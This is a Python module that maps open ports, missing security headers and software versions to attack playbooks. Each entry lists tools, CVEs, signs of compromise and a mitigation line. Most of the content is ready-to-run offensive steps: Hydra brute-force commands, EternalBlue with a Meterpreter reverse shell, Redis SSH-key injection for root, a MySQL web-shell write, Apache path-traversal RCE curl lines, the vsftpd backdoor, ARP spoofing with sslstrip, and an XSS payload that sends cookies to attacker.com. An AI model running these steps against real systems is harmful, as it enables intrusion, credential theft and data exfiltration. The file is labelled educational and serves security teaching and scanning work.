"""
attack_intel.py — Maps vulnerabilities to attack techniques, tools, steps, CVEs.
For academic/educational demonstration only.
"""

# ─── Attack Playbook Database ──────────────────────────────────────────────────
# Each entry maps a port or vulnerability key to a full attack guide.
# Fields: attack_name, attack_type, cve, tools, impact, steps[], mitigation

ATTACK_PLAYBOOK = {

    # ── FTP (Port 21) ──────────────────────────────────────────────────────────
    21: {
        'attack_name':  'FTP Anonymous Login / Brute Force',
        'attack_type':  'Credential Attack',
        'cve':          'CVE-1999-0497',
        'tools':        ['Hydra', 'Medusa', 'Metasploit (ftp_login)'],
        'impact':       'Unauthorised file read/write, data exfiltration, server takeover.',
        'steps': [
            'Confirm FTP is open: nmap -sV -p 21 <target>',
            'Test anonymous login: ftp <target> → username: anonymous → password: <blank>',
            'If anonymous fails, brute-force credentials: hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>',
            'Once logged in, list files: ls -la',
            'Download sensitive files: get <filename>',
            'Upload a web shell if web root is writable: put shell.php',
        ],
        'already_exploited_signs': [
            'Unauthorised files in FTP directory',
            'Login logs show "anonymous" from external IPs',
            'Web shell found in /var/www/html',
        ],
        'mitigation': 'Disable anonymous FTP. Switch to SFTP. Use strong credentials + IP whitelist.',
    },

    # ── SSH (Port 22) ──────────────────────────────────────────────────────────
    22: {
        'attack_name':  'SSH Brute Force / User Enumeration',
        'attack_type':  'Credential Attack / Information Disclosure',
        'cve':          'CVE-2018-15473',
        'tools':        ['Hydra', 'Medusa', 'ssh-audit', 'Metasploit (ssh_enumusers)'],
        'impact':       'Full shell access, privilege escalation, lateral movement.',
        'steps': [
            'Enumerate valid usernames: msf > use auxiliary/scanner/ssh/ssh_enumusers',
            'Set RHOSTS and USER_FILE, then run.',
            'Brute-force valid user: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>',
            'Login with found credentials: ssh root@<target>',
            'Escalate privileges: sudo -l → exploit NOPASSWD entries',
        ],
        'already_exploited_signs': [
            '/root/.ssh/authorized_keys contains unknown public keys',
            'Unexpected cron jobs or new user accounts',
            'Auth logs show thousands of failed attempts then a success',
        ],
        'mitigation': 'Disable password auth (key-only). Disable root login. Use fail2ban. Enable MFA.',
    },

    # ── Telnet (Port 23) ──────────────────────────────────────────────────────
    23: {
        'attack_name':  'Telnet Credential Sniffing / Brute Force',
        'attack_type':  'Plaintext Credential Interception',
        'cve':          'CVE-1999-0530',
        'tools':        ['Wireshark', 'tcpdump', 'Hydra', 'Ettercap'],
        'impact':       'Full credentials captured in plaintext, complete system access.',
        'steps': [
            'Confirm Telnet: nmap -sV -p 23 <target>',
            'Sniff traffic on LAN: tcpdump -i eth0 port 23 -A',
            'In Wireshark: filter "telnet" → follow TCP stream → credentials visible in plaintext',
            'Alternatively, brute force: hydra -l admin -P rockyou.txt telnet://<target>',
            'Connect: telnet <target> → enter captured credentials',
        ],
        'already_exploited_signs': [
            'Unexpected logins in /var/log/auth.log',
            'Network traffic dump shows Telnet sessions from unknown IPs',
        ],
        'mitigation': 'Disable Telnet immediately. Replace with SSH. Block port 23 at firewall.',
    },

    # ── SMTP (Port 25) ─────────────────────────────────────────────────────────
    25: {
        'attack_name':  'SMTP Open Relay / Email Spoofing',
        'attack_type':  'Mail Relay Abuse',
        'cve':          'CVE-2002-1278',
        'tools':        ['telnet', 'swaks', 'Metasploit (smtp_relay)'],
        'impact':       'Spam campaigns, phishing emails sent from your domain, blacklisting.',
        'steps': [
            'Test open relay: telnet <target> 25',
            'EHLO attacker.com',
            'MAIL FROM: <fake@anyplace.com>',
            'RCPT TO: <victim@gmail.com>',
            'DATA → type message → . (dot to end)',
            'If accepted, server is an open relay — can send unlimited spoofed emails.',
            'Automate: swaks --to victim@gmail.com --from ceo@targetcompany.com --server <target>',
        ],
        'already_exploited_signs': [
            'Mail logs show RCPT TO addresses outside your domain',
            'Server IP on spam blacklists (check mxtoolbox.com)',
        ],
        'mitigation': 'Configure SMTP to require authentication. Enable SPF, DKIM, DMARC records.',
    },

    # ── HTTP (Port 80) ─────────────────────────────────────────────────────────
    80: {
        'attack_name':  'HTTP Downgrade / Directory Traversal / Web App Attacks',
        'attack_type':  'Web Application Attack',
        'cve':          'CVE-2021-41773',
        'tools':        ['Nikto', 'Burp Suite', 'Gobuster', 'SQLMap'],
        'impact':       'Data theft, defacement, code execution, credential theft.',
        'steps': [
            'Scan for vulnerabilities: nikto -h http://<target>',
            'Discover hidden directories: gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt',
            'Test for SQL Injection: sqlmap -u "http://<target>/page?id=1" --dbs',
            'Test for XSS: enter <script>alert(1)</script> in all input fields',
            'Intercept requests in Burp Suite → modify parameters → test for IDOR',
            'Check Apache path traversal (CVE-2021-41773): curl http://<target>/cgi-bin/.%2e/.%2e/etc/passwd',
        ],
        'already_exploited_signs': [
            'Defaced index page',
            'Unknown PHP/ASPX files in web root',
            'Database records modified unexpectedly',
        ],
        'mitigation': 'Force HTTPS. Keep web server patched. Use WAF. Validate all user input.',
    },

    # ── SMB (Port 445) ─────────────────────────────────────────────────────────
    445: {
        'attack_name':  'EternalBlue (MS17-010) / SMB Relay',
        'attack_type':  'Remote Code Execution',
        'cve':          'CVE-2017-0144',
        'tools':        ['Metasploit (ms17_010_eternalblue)', 'nmap smb-vuln scripts', 'Responder'],
        'impact':       'SYSTEM-level remote code execution, WannaCry ransomware vector.',
        'steps': [
            'Check if vulnerable: nmap -p 445 --script smb-vuln-ms17-010 <target>',
            'If "VULNERABLE" appears, open Metasploit: msfconsole',
            'use exploit/windows/smb/ms17_010_eternalblue',
            'set RHOSTS <target>',
            'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
            'set LHOST <your-ip>',
            'run → get Meterpreter shell with SYSTEM privileges',
            'Dump hashes: hashdump',
            'Pivot: run post/multi/recon/local_exploit_suggester',
        ],
        'already_exploited_signs': [
            'Ransomware encrypted files (.wncry extension)',
            'New admin accounts created',
            'Unusual outbound connections on port 4444/443',
        ],
        'mitigation': 'Apply MS17-010 patch immediately. Disable SMBv1. Block 445 externally.',
    },

    # ── RDP (Port 3389) ────────────────────────────────────────────────────────
    3389: {
        'attack_name':  'RDP Brute Force / BlueKeep (CVE-2019-0708)',
        'attack_type':  'Remote Code Execution / Credential Attack',
        'cve':          'CVE-2019-0708',
        'tools':        ['Hydra', 'Crowbar', 'Metasploit (cve_2019_0708_bluekeep_rce)'],
        'impact':       'Full GUI desktop access, SYSTEM RCE, ransomware delivery.',
        'steps': [
            'Check BlueKeep vulnerability: nmap -p 3389 --script rdp-vuln-ms12-020 <target>',
            'Brute force RDP: hydra -l Administrator -P rockyou.txt rdp://<target>',
            'For BlueKeep RCE in Metasploit:',
            'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'set RHOSTS <target> → set PAYLOAD → run',
            'Once in: xfreerdp /u:Administrator /p:<found-pass> /v:<target>',
        ],
        'already_exploited_signs': [
            'RDP sessions from unknown foreign IPs in Event Viewer (Event ID 4624)',
            'Ransomware deployed',
            'New local admin accounts',
        ],
        'mitigation': 'Patch BlueKeep. Enable NLA. Restrict RDP to VPN only. Use strong passwords + MFA.',
    },

    # ── MySQL (Port 3306) ──────────────────────────────────────────────────────
    3306: {
        'attack_name':  'MySQL Remote Access / SQL Injection',
        'attack_type':  'Database Attack',
        'cve':          'CVE-2012-2122',
        'tools':        ['mysql client', 'SQLMap', 'Hydra', 'Metasploit'],
        'impact':       'Full database dump, data manipulation, OS command execution via MySQL.',
        'steps': [
            'Check if remotely accessible: nmap -sV -p 3306 <target>',
            'Try default credentials: mysql -h <target> -u root -p (blank password)',
            'Brute force: hydra -l root -P rockyou.txt mysql://<target>',
            'Once in: SHOW DATABASES; USE target_db; SELECT * FROM users;',
            'Dump credentials: SELECT user, password FROM mysql.user;',
            'If FILE privilege: SELECT "<?php system($_GET[\'cmd\']); ?>" INTO OUTFILE \'/var/www/html/shell.php\';',
            'OS command execution: sys_exec("id") if UDF installed',
        ],
        'already_exploited_signs': [
            'Unknown user accounts in mysql.user table',
            'Web shell files in document root',
            'Unexpected SELECT queries in slow query log',
        ],
        'mitigation': 'Bind MySQL to 127.0.0.1. Use strong root password. Remove anonymous users. Disable FILE privilege.',
    },

    # ── Redis (Port 6379) ──────────────────────────────────────────────────────
    6379: {
        'attack_name':  'Redis Unauthenticated RCE via SSH Key Injection',
        'attack_type':  'Remote Code Execution',
        'cve':          'CVE-2022-0543',
        'tools':        ['redis-cli', 'Metasploit (redis_unauth_exec)'],
        'impact':       'Write arbitrary files as root, full server takeover.',
        'steps': [
            'Connect without password: redis-cli -h <target>',
            'Verify: ping → should reply PONG (unauthenticated access confirmed)',
            'Get server info: info server',
            'Method 1 — SSH key injection:',
            '  Generate key: ssh-keygen -t rsa -f /tmp/rediskey',
            '  (echo -e "\\n\\n"; cat /tmp/rediskey.pub; echo -e "\\n\\n") > /tmp/key.txt',
            '  cat /tmp/key.txt | redis-cli -h <target> -x set crackit',
            '  redis-cli -h <target> config set dir /root/.ssh',
            '  redis-cli -h <target> config set dbfilename authorized_keys',
            '  redis-cli -h <target> save',
            '  ssh -i /tmp/rediskey root@<target>  ← root shell!',
            'Method 2 — Cron job: write cron entry to /var/spool/cron/root',
        ],
        'already_exploited_signs': [
            'Unknown keys in /root/.ssh/authorized_keys',
            'Unexpected cron jobs running as root',
            'Redis config dir changed from /var/lib/redis',
        ],
        'mitigation': 'Set requirepass in redis.conf. Bind to 127.0.0.1. Disable config command externally.',
    },

    # ── MongoDB (Port 27017) ───────────────────────────────────────────────────
    27017: {
        'attack_name':  'MongoDB Unauthenticated Data Dump',
        'attack_type':  'Unauthorised Data Access',
        'cve':          'CVE-2013-4650',
        'tools':        ['mongosh', 'Metasploit (mongodb_unauth)', 'NoSQLMap'],
        'impact':       'Complete database dump, PII exposure, data manipulation.',
        'steps': [
            'Connect: mongosh --host <target> --port 27017',
            'List all databases: show dbs',
            'Use a database: use admin',
            'Dump all collections: db.getCollectionNames()',
            'Read data: db.<collection>.find().pretty()',
            'Extract user credentials: db.users.find({}, {password:1, email:1})',
            'Export entire DB: mongodump --host <target> --out /tmp/dump',
        ],
        'already_exploited_signs': [
            'Collections deleted and replaced with ransom note (common MongoDB ransom attack)',
            'Unexpected admin users in db.system.users',
        ],
        'mitigation': 'Enable --auth flag. Create admin user. Bind to localhost. Use network-level firewall.',
    },

    # ── Elasticsearch (Port 9200) ──────────────────────────────────────────────
    9200: {
        'attack_name':  'Elasticsearch Unauthenticated Data Exposure',
        'attack_type':  'Information Disclosure / Data Exfiltration',
        'cve':          'CVE-2015-1427',
        'tools':        ['curl', 'Metasploit (elasticsearch_groovy_rce)'],
        'impact':       'Full data dump of all indices, potential RCE via Groovy scripting.',
        'steps': [
            'Check access: curl http://<target>:9200/',
            'List all indices: curl http://<target>:9200/_cat/indices?v',
            'Dump an index: curl http://<target>:9200/<index_name>/_search?size=1000',
            'Search across all: curl http://<target>:9200/_search?q=password',
            'RCE via Groovy (CVE-2015-1427): use Metasploit elasticsearch_script_mvel_rce',
        ],
        'already_exploited_signs': [
            'Indices deleted and .ransom index present',
            'Unusual _bulk delete operations in logs',
        ],
        'mitigation': 'Enable X-Pack security. Bind to localhost. Use nginx reverse proxy with auth.',
    },

    # ── VNC (Port 5900) ────────────────────────────────────────────────────────
    5900: {
        'attack_name':  'VNC Authentication Bypass / Brute Force',
        'attack_type':  'Credential Attack / Remote Desktop Access',
        'cve':          'CVE-2006-2369',
        'tools':        ['Hydra', 'Metasploit (vnc_login)', 'vncviewer'],
        'impact':       'Full graphical desktop access, keylogging, screen capture.',
        'steps': [
            'Check VNC: nmap -sV -p 5900 --script vnc-info <target>',
            'Test no-auth bypass: vncviewer <target> (some configs require no password)',
            'Brute force: hydra -P /usr/share/wordlists/rockyou.txt vnc://<target>',
            'In Metasploit: use auxiliary/scanner/vnc/vnc_login → set RHOSTS → run',
            'Connect with found password: vncviewer -passwd found_pass <target>',
        ],
        'already_exploited_signs': [
            'Screen recordings or screenshots taken without knowledge',
            'Unexpected mouse/keyboard activity logged',
        ],
        'mitigation': 'Use VNC over SSH tunnel only. Set strong password. Disable if not needed.',
    },
}

# ─── Header Attack Mapping ─────────────────────────────────────────────────────
HEADER_ATTACK_PLAYBOOK = {
    'Strict-Transport-Security': {
        'attack_name':  'SSL Stripping / HTTPS Downgrade',
        'attack_type':  'Man-in-the-Middle',
        'cve':          None,
        'tools':        ['sslstrip', 'Ettercap', 'mitmproxy'],
        'impact':       'Credentials and session tokens captured in plaintext.',
        'steps': [
            'Position attacker between victim and server (ARP spoofing): ettercap -T -q -i eth0 -M arp:remote /<gateway>// /<target>//',
            'Strip HTTPS with sslstrip: sslstrip -l 8080',
            'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080',
            'Victim browses to http:// version of site → traffic is plaintext',
            'Capture credentials in sslstrip.log',
        ],
        'mitigation': 'Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
    },
    'Content-Security-Policy': {
        'attack_name':  'Cross-Site Scripting (XSS)',
        'attack_type':  'Injection Attack',
        'cve':          None,
        'tools':        ['Burp Suite', 'XSStrike', 'BeEF Framework'],
        'impact':       'Session hijacking, credential theft, drive-by malware delivery.',
        'steps': [
            'Find input fields: comments, search boxes, profile fields',
            'Test basic XSS: <script>alert(document.cookie)</script>',
            'Steal cookies: <script>document.location="http://attacker.com/?c="+document.cookie</script>',
            'Use BeEF for browser exploitation: hook victim browser via XSS payload',
            'Automated scan: xsstrike -u "http://<target>/search?q=test"',
        ],
        'mitigation': "Add header: Content-Security-Policy: default-src 'self'",
    },
    'X-Frame-Options': {
        'attack_name':  'Clickjacking',
        'attack_type':  'UI Redress Attack',
        'cve':          None,
        'tools':        ['Burp Suite', 'Custom HTML iframe page'],
        'impact':       'Trick users into clicking hidden buttons — unauthorised actions, forced logins.',
        'steps': [
            'Create an HTML page with the target in an invisible iframe:',
            '<iframe src="http://<target>/transfer-funds" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>',
            '<button style="position:absolute;top:200px;left:300px">Click here to win a prize!</button>',
            'Host this page and trick the victim into visiting it',
            'Victim clicks "prize button" but actually clicks the hidden iframe button',
        ],
        'mitigation': 'Add header: X-Frame-Options: DENY',
    },
    'X-Content-Type-Options': {
        'attack_name':  'MIME Sniffing Attack',
        'attack_type':  'Content Injection',
        'cve':          None,
        'tools':        ['Burp Suite'],
        'impact':       'Browser executes uploaded file as wrong type (e.g., image executed as JS).',
        'steps': [
            'Upload a file with a misleading extension (e.g., evil.jpg containing JavaScript)',
            'Browser sniffs the content type and may execute it as script',
            'Combine with XSS for full exploitation',
        ],
        'mitigation': 'Add header: X-Content-Type-Options: nosniff',
    },
}

# ─── Version-specific Attack Mapping ──────────────────────────────────────────
VERSION_ATTACK_PLAYBOOK = {
    'vsftpd 2.3.4': {
        'attack_name':  'vsftpd 2.3.4 Backdoor Command Execution',
        'attack_type':  'Remote Code Execution',
        'cve':          'CVE-2011-2523',
        'tools':        ['Metasploit (vsftpd_234_backdoor)', 'netcat'],
        'impact':       'Root shell without any credentials required.',
        'steps': [
            'Confirm version: nmap -sV -p 21 <target>',
            'In Metasploit: msfconsole',
            'use exploit/unix/ftp/vsftpd_234_backdoor',
            'set RHOSTS <target>',
            'run → instant root shell via backdoor on port 6200',
            'Manual: telnet <target> 21 → USER :) → triggers backdoor → nc <target> 6200',
        ],
        'mitigation': 'Upgrade vsftpd immediately. This version contains a deliberate backdoor.',
    },
    'OpenSSH 7.4': {
        'attack_name':  'OpenSSH Username Enumeration',
        'attack_type':  'Information Disclosure',
        'cve':          'CVE-2018-15473',
        'tools':        ['ssh_user_enum.py', 'Metasploit (ssh_enumusers)'],
        'impact':       'Valid usernames discovered → enables targeted brute force.',
        'steps': [
            'use auxiliary/scanner/ssh/ssh_enumusers in Metasploit',
            'set RHOSTS <target>',
            'set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt',
            'run → lists valid vs invalid usernames based on timing difference',
            'Then brute-force valid users: hydra -l <valid_user> -P rockyou.txt ssh://<target>',
        ],
        'mitigation': 'Upgrade OpenSSH to 7.7+. Use fail2ban. Consider key-only authentication.',
    },
    'Apache/2.4.29': {
        'attack_name':  'Apache Path Traversal (CVE-2021-41773)',
        'attack_type':  'Path Traversal / RCE',
        'cve':          'CVE-2021-41773',
        'tools':        ['curl', 'Metasploit (apache_normalize_path_rce)'],
        'impact':       'Read arbitrary files, execute OS commands if mod_cgi enabled.',
        'steps': [
            'Test path traversal: curl "http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"',
            'If /etc/passwd returns → vulnerable',
            'Test RCE (if mod_cgi enabled): curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://<target>/cgi-bin/.%2e/.%2e/.%2e/bin/sh"',
            'Metasploit: use exploit/multi/http/apache_normalize_path_rce → run',
        ],
        'mitigation': 'Upgrade to Apache 2.4.51+. Disable mod_cgi. Apply vendor patches.',
    },
}


def get_attack_intel(finding: dict) -> dict:
    """
    Given a finding dict from risk_engine, return attack intelligence.
    """
    port    = finding.get('port')
    f_type  = finding.get('type')
    title   = finding.get('title', '')

    # Version-based
    if f_type == 'version':
        for pattern, intel in VERSION_ATTACK_PLAYBOOK.items():
            if pattern.lower() in title.lower():
                return intel

    # Header-based
    if f_type == 'header':
        for header, intel in HEADER_ATTACK_PLAYBOOK.items():
            if header.lower() in title.lower():
                return intel

    # Port-based
    if port and port in ATTACK_PLAYBOOK:
        return ATTACK_PLAYBOOK[port]

    return None
